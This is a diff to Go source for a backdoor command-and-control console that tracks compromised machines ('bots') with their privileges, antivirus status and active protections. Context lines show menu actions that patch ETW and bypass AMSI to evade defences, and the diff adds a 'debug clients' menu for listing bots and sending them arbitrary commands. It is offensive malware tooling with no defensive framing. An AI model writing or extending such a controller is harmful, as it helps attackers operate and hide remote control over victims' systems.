@@ -45,6 +45,7 @@ type Backdoor struct {
 	CanElevate bool      // Privilege escalation possibility
 	AVStatus   string    // Antivirus status
 	Protection []string  // Active protection mechanisms
+	IsDebug    bool      // Debug mode flag
 }
 
 var (
@@ -170,6 +171,7 @@ func handleConnection(conn net.Conn) {
 		LastSeen:   time.Now(),
 		AVStatus:   parts[4],
 		Protection: strings.Split(parts[7], ","),
+		IsDebug:    false,
 	}
 
 	// Register new client
@@ -295,7 +297,8 @@ func showMenu() {
 	fmt.Println("6. Client information")
 	fmt.Println("7. Broadcast command")
 	fmt.Println("8. Antivirus management")
-	fmt.Println("9. Exit")
+	fmt.Println("9. Debug clients")
+	fmt.Println("10. Exit")
 }
 
 // Display detailed client information
@@ -354,6 +357,73 @@ func handleAVManagement(backdoor *Backdoor) {
 		handleCommand(backdoor, CMD_PATCH_ETW)
 	case 6:
 		handleCommand(backdoor, CMD_BYPASS_AMSI)
+	}
+}
+
+// Handle debug clients menu
+func handleDebugMenu() {
+	fmt.Println("\nDebug Clients Menu:")
+	fmt.Println("1. List debug clients")
+	fmt.Println("2. Send command to debug client")
+	fmt.Println("3. Debug client information")
+	fmt.Println("4. Back to main menu")
+	
+	var choice int
+	fmt.Print("Select action: ")
+	fmt.Scan(&choice)
+	
+	switch choice {
+	case 1:
+		// List debug clients
+		fmt.Println("\nActive debug clients:")
+		mutex.Lock()
+		for id, backdoor := range activeBots {
+			if backdoor.IsDebug {
+				fmt.Printf("[%s] OS: %s/%s, Privileges: %s, Version: %s (DEBUG)\n",
+					id, backdoor.OS, backdoor.Arch, backdoor.Privileges, backdoor.Version)
+			}
+		}
+		mutex.Unlock()
+		
+	case 2:
+		// Send command to debug client
+		fmt.Print("Enter client ID: ")
+		scanner := bufio.NewScanner(os.Stdin)
+		scanner.Scan()
+		botID := strings.TrimSpace(scanner.Text())
+		
+		fmt.Print("Enter command: ")
+		scanner.Scan()
+		command := strings.TrimSpace(scanner.Text())
+		
+		mutex.Lock()
+		if backdoor, ok := activeBots[botID]; ok && backdoor.IsDebug {
+			handleCommand(backdoor, command)
+		} else {
+			fmt.Println("Debug client not found!")
+		}
+		mutex.Unlock()
+		
+	case 3:
+		// Show debug client information
+		fmt.Print("Enter client ID: ")
+		scanner := bufio.NewScanner(os.Stdin)
+		scanner.Scan()
+		botID := strings.TrimSpace(scanner.Text())
+		
+		mutex.Lock()
+		if backdoor, ok := activeBots[botID]; ok && backdoor.IsDebug {
+			fmt.Printf("\nDebug Client Information %s:\n", botID)
+			fmt.Printf("Operating System: %s\n", backdoor.OS)
+			fmt.Printf("Architecture: %s\n", backdoor.Arch)
+			fmt.Printf("Privileges: %s\n", backdoor.Privileges)
+			fmt.Printf("Version: %s\n", backdoor.Version)
+			fmt.Printf("Last seen: %s\n", backdoor.LastSeen.Format("2006-01-02 15:04:05"))
+			fmt.Printf("Antivirus: %s\n", backdoor.AVStatus)
+		} else {
+			fmt.Println("Debug client not found!")
+		}
+		mutex.Unlock()
 	}
 }
 
@@ -513,6 +583,10 @@ func main() {
 			mutex.Unlock()
 
 		case 9:
+			// Debug clients menu
+			handleDebugMenu()
+
+		case 10:
 			// Exit program
 			fmt.Println("Exiting...")
 			return
